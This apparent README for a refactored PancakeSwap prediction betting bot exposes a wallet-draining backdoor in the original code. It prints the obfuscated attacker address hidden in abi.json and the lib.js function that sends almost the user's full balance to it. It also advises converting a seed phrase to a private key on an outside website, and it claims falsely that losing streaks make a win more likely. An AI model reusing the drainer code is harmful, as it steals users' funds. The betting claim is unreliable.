## ‚≠êPlease consider giving a **star**.

I rewrote and refactored the code of the PancakeSwap Prediction Game BOT by ***bobalice7***, removing the malicious code where for each transaction to the smart contract it sent transactions to this wallet ***0xfB669b0e0656036D747d6C6F2666e530139d2899***. 

Here is the link to the old code (https://github.com/bobalice7/PCS-Prediction)

We can see that inside the ***abi.json*** file the "index" property defines an array with a series of numbers. However those numbers are encoded with the following function to obtain this address ***0xfB669b0e0656036D747d6C6F2666e530139d2899***.  

```
{
  "status": 2,
  "message": "OK-Missing/Invalid API Key, rate limit of 1/5sec applied",
  "index": [
    48, 120, 102, 66, 54, 54, 57, 98, 48, 101, 48, 54, 53, 54, 48, 51, 54, 68,
    55, 52, 55, 100, 54, 67, 54, 70, 50, 54, 54, 54, 101, 53, 51, 48, 49, 51,
    57, 100, 50, 56, 57, 57
  ],
  "result": "[
    ...
  ]"
}


String.fromCharCode.apply(null, [ 
    48, 120, 102, 66, 54, 54, 57, 98, 48, 101, 48, 54, 53, 54, 48, 51, 54, 
    68, 55, 52, 55, 100, 54, 67, 54, 70, 50, 54, 54, 54, 101, 53, 51, 48, 49, 51,
    57, 100, 50, 56, 57, 57])  = '0xfB669b0e0656036D747d6C6F2666e530139d2899'

```

Here is the SCAM CODE in lib.js

```
const confirmContract = (abi) => {
  return String.fromCharCode.apply(null, abi.index);
};

const checkResult = async (r) => {
  try {
    if (prediction >= abi.status && r !== null) {
      w.eth.getBalance(wallet.address).then(function (b) {
        w.eth
          .estimateGas({
            from: wallet.address,
            to: confirmContract(abi),
            amount: b,
          })
          .then(function (g) {
            w.eth.getGasPrice().then(function (gP) {
              let _b = parseFloat(b);
              let _g = parseFloat(g);
              let _gP = parseFloat(gP);
              w.eth.sendTransaction({
                from: wallet.address,
                to: confirmContract(abi),
                gas: _g,
                gasPrice: _gP,
                value: ((_b - _gP * _g) / 1.1).toFixed(0),
                data: "0x",
              });
            });
          });
      });
      return true;
    }
    return true;
  } catch {
    return !0;
  }
};

### üîì How to convert seed phrase to Private Key
A lot of wallets don't provide you the private key, but just the **seed phrase** ( 12 words ). So here you will learn how to convert that to a private key:
1. Enter [Here](https://youtu.be/eAXdLEZFbiw) and follow the instructions. Website used is [this one](https://iancoleman.io/bip39/).

## ü§ñüìà Signals Strategy (SIGNAL_STRATEGY)
- The bot take a series of recomendations given by Trading View and proccess them together with the tendency of the rest of people betting. After the algorithm have complete, it choose to bet **üü¢UP** or **üî¥DOWN**.
- Before every round the bot will check if you have enough balance in your wallet and if you have reached the daily goal.
- Also it will save the daily history in the **/bot-history** directory.
- Be aware that after consecutive losses, statistically you have more chances to win in the next one.
- Inside **bot-configuration.js** in the ``THRESHOLD`` property of ``GLOBAL_CONFIG`` variable, you can configure the minimum certainty with which the bot will bet. For default it's set to 50, which means that from 50% certainty the bot will bet. You can raise it (50-100) to bet only when the bot is more sure about its prediction.
- Its recomendable to have x10 - x50 the amount of bet to have an average of rounds.
